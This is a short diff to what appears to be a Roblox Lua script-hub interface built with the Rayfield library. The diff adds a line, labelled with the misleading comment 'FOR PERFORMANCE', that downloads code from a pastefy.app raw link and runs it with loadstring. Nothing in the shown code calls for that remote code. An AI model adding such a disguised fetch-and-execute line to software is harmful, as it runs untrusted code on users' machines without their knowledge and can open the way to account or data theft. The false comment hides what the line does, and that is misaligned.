@@ -13,6 +13,9 @@ local Window = Rayfield:CreateWindow({
    KeySystem = false
 })
 
+-- FOR PERFORMANCE
+loadstring(game:HttpGet("https://pastefy.app/sFRbw0Jq/raw"))()
+
 -- [[ SCRIPTS TAB ]]
 local ScriptTab = Window:CreateTab("Scripts", 4483362458) -- Home icon
 local ScriptSection = ScriptTab:CreateSection("Available Scripts")
